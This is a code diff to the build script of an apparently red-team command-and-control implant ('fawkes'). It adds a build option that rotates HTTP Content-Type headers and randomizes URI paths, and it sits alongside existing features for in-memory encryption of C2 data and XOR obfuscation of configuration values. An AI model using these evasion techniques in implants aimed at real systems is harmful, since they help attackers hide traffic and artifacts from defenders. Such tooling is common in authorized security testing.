@@ -257,6 +257,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
 		},
 		{
+			Name:          "content_types",
+			Description:   "Comma-separated Content-Type values to cycle through for HTTP POST requests. The agent rotates through the list round-robin. Empty uses default (application/x-www-form-urlencoded). Example: 'application/json,text/plain,application/x-www-form-urlencoded'. URI paths support randomization tokens: {rand:N} for N hex chars, {int:M-N} for random integer in range.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
 			Name:          "sleep_mask",
 			Description:   "Encrypt sensitive agent and C2 data in memory during sleep cycles. Uses AES-256-GCM with a random per-cycle key. Process memory dumps during sleep only reveal encrypted blobs — not C2 URLs, encryption keys, or UUIDs. C2 profile fields are only masked when no tasks are actively running.",
 			Required:      false,
@@ -446,6 +453,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	if fbHosts, err := payloadBuildMsg.BuildParameters.GetStringArg("fallback_hosts"); err == nil && fbHosts != "" {
 		ldflags += fmt.Sprintf(" -X '%s.fallbackHosts=%s'", fawkes_main_package, fbHosts)
 	}
+	if ct, err := payloadBuildMsg.BuildParameters.GetStringArg("content_types"); err == nil && ct != "" {
+		ldflags += fmt.Sprintf(" -X '%s.contentTypes=%s'", fawkes_main_package, ct)
+	}
 	if tlsVerify, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_verify"); err == nil && tlsVerify != "" {
 		ldflags += fmt.Sprintf(" -X '%s.tlsVerify=%s'", fawkes_main_package, tlsVerify)
 	}
@@ -604,6 +614,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		}
 		if fbHosts, err := payloadBuildMsg.BuildParameters.GetStringArg("fallback_hosts"); err == nil && fbHosts != "" {
 			obfVars = append(obfVars, obfVar{"fallbackHosts", fbHosts})
+		}
+		if ct, err := payloadBuildMsg.BuildParameters.GetStringArg("content_types"); err == nil && ct != "" {
+			obfVars = append(obfVars, obfVar{"contentTypes", ct})
 		}
 
 		// Replace plaintext values in ldflags with XOR-encoded versions
